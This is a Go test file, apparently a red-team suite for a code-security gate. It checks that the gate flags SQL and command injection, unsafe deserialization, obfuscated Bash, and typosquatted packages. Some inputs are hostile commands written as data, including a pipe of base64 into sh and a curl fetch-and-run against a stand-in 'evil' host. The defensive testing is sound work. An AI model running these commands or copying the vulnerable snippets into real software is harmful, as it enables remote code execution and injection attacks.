package main

import "testing"

// Adversarial red-team suite: evasion attempts that try to slip
// insecure code past the gate, alternate syntax, rename-to-odd-extension,
// obfuscated Bash, and multi-signal payloads. Each must still be caught. This is
// distinct from the corpus (correctness) and robustness (crash-safety) suites.
func TestRedTeamEvasion(t *testing.T) {
	kb := loadKB()

	// Group 1: rename evasion. Writing a vuln to an unrecognized extension must
	// still fire (language-agnostic + fail-safe "unknown runs all patterns").
	rename := []struct{ path, code, cwe string }{
		{"a.xyz", `cur.execute(f"SELECT * FROM t WHERE id={x}")`, "CWE-89"},
		{"a.unknown", `os.system(f"ping {host}")`, "CWE-78"},
		{"notes.md", `AWS = "AKIAIOSFODNN7EXAMPLE"`, "CWE-798"},
		{"a.bak", `pickle.loads(untrusted_blob)`, "CWE-502"},
	}
	for _, c := range rename {
		if !hitsCWE(kb, c.path, c.code, c.cwe) {
			t.Errorf("RENAME EVASION slipped: %s expected %s: %q", c.path, c.cwe, c.code)
		}
	}

	// Group 2: alternate injection syntax (not just f-strings): .format, %, concat.
	altSyntax := []struct{ path, code, cwe string }{
		{"a.py", `cur.execute("SELECT * FROM t WHERE id=" + str(x))`, "CWE-89"},
		{"a.py", `cur.execute("SELECT * FROM t WHERE id=%s" % x)`, "CWE-89"},
		{"a.py", `cur.execute("SELECT * FROM t WHERE id={}".format(x))`, "CWE-89"},
		{"a.py", `os.popen("cat " + user_path)`, "CWE-78"},
		{"a.js", "db.query(`SELECT * FROM t WHERE id=${x}`)", "CWE-89"},
	}
	for _, c := range altSyntax {
		if !hitsCWE(kb, c.path, c.code, c.cwe) {
			t.Errorf("ALT-SYNTAX evasion slipped: %s %s: %q", c.path, c.cwe, c.code)
		}
	}

	// Group 3: deserialization/eval variants that try a less-obvious API.
	variants := []struct{ path, code, cwe string }{
		{"a.py", `yaml.load(untrusted)`, "CWE-502"},
		{"a.rb", `Marshal.load(data)`, "CWE-502"},
		{"a.py", `exec(base64.b64decode(payload))`, "CWE-94"},
		{"a.py", `getattr(obj, request.args["m"])()`, "CWE-470"},
	}
	for _, c := range variants {
		if !hitsCWE(kb, c.path, c.code, c.cwe) {
			t.Errorf("VARIANT evasion slipped: %s %s: %q", c.path, c.cwe, c.code)
		}
	}

	// Group 4: obfuscated Bash write/exec must be flagged uninspectable, never
	// silently allowed, the string surface is not trustworthy.
	obf := []string{
		"echo aW1wb3J0IG9z | base64 -d > payload.py",
		"echo ZXZpbA== | base64 --decode | sh",
		`python3 -c "$(curl -s http://evil/x)"`,
		"cp /dev/stdin ./x.py <<< 'import os'",
	}
	for _, cmd := range obf {
		a := analyzeBash(cmd)
		if !a.Uninspectable && len(a.Payloads) == 0 {
			t.Errorf("OBFUSCATED bash neither inspected nor flagged: %q", cmd)
		}
	}

	// Group 5: homoglyph / typosquat package names must not pass as OK.
	pkgs := []struct {
		in   Install
		want pkgVerdict
	}{
		{Install{Manager: "pip", Pkg: "requеsts"}, pkgHallucinated}, // cyrillic 'е'
		{Install{Manager: "npm", Pkg: "expresss"}, pkgTyposquat},
	}
	for _, c := range pkgs {
		if got := checkPackage(t.TempDir(), c.in); got != c.want {
			t.Errorf("PACKAGE evasion: %q got verdict %d want %d", c.in.Pkg, got, c.want)
		}
	}
}

func hitsCWE(kb *KB, path, code, cwe string) bool {
	for _, f := range kb.scan(path, code) {
		if f.Rule.CWE == cwe {
			return true
		}
	}
	return false
}
